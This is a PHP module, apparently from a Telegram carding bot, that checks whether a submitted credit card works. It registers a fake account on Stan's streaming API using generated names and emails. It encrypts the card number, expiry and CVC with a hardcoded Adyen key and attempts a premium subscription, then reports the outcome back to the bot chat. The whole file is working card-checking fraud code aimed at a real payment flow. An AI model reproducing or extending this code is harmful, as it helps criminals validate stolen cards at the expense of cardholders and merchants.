<?php

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];
const API_KEY = '10001|9C2674B7246B5751F156BEF8BC246A0968278C75332260379651D2665D1265B25D5539EF4D2728192087DA3869674496BBB15AA8A6F0B9A009BACA1FFDD8C0FAAF195D0A518E69637683D3A5556C09D759C35C6D965B9391249895CBB59A8FA0D07B7248DB26CE0CB9A4CDD69D10F68EC080385052E690A35127580761EB369868F03A4A70C017476B3CDF6D080EFB14292E4EC4D0B53049C86B567240DD3D879CD1C1AE9B28083A5D8CD91E6D91C8694370FD682B96EA76C0142770A66055A35B542F0C96A1918E3F37E8FB0C81DDC823ED546B878A479D6C8D68AFB237876F6BD6063C81B2B8EBFF787A3F6EFF78407DBE17BB6AD93536417BDF8D726BEB57';

$encrypt_result = shell_exec(ParseAdyenCli(API_KEY, $cc, trim(Name::firstName()) . ' ' . Name::lastName()) . ' node adyen/encrypt/index.js');
$cse = json_decode($encrypt_result, true);

# ~ REQ 1 ~ #
$header1 = ['accept: */*', 'Content-Type: application/x-www-form-urlencoded; charset=utf-8', 'Referer: https://www.stan.com.au/'];
$post1 = 'email='.Internet::freeEmail().'&password=12456789&firstName='.Name::firstName().'&lastName='.Name::lastName().'&gender=m&birthDate=2000-12-12&postcode=3300&tier=premiumv4&termsVersion=2';
$site1 = ['url' => 'https://api.stan.com.au/accounts/v1/accounts','method' => 'POST', 'post' => $post1, 'headers' => $header1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);
$res1 = json_decode($req1->body, true);
$jwtoken = $res1['jwToken'];
# ~ REQ 2 ~ #
$header2 = ['accept: */*', 'Content-Type: application/x-www-form-urlencoded; charset=utf-8', 'Referer: https://www.stan.com.au/'];
$post2 = 'jwToken='.$jwtoken.'&tier=premiumv4&email='.Internet::freeEmail().'&encryptedCardNumber='.urlencode($cse['cc']).'&encryptedExpiryMonth='.urlencode($cse['mm']).'&encryptedExpiryYear='.urlencode($cse['yy']).'&encryptedSecurityCode='.urlencode($cse['cvc']);
$site2 = ['url' => 'https://api.stan.com.au/billing/v1/full-subscription?landingPage=/','method' => 'POST', 'post' => $post2, 'headers' => $header2, 'cookie' => null, 'proxy' => null];
$req2 = Make::Create(1, $site2, $gate, $user);
IsUnspam($req2, $user);

Res::SetParams($req2->body, $req1->code);
$res = Res::StanAd();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));